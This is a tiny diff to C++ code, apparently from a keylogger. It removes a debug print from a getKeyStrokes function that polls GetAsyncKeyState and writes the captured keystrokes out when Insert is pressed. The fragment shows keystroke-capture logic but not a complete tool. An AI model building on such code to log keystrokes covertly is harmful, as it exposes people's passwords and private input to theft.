@@ -39,7 +39,6 @@ string getKeyStrokes(string masterString)
 		}
 		else if (GetAsyncKeyState(VK_INSERT) & 0x8000)
 		{
-			cout << "LOL";
 			writeData(masterString);
 			exit(1);
 		}
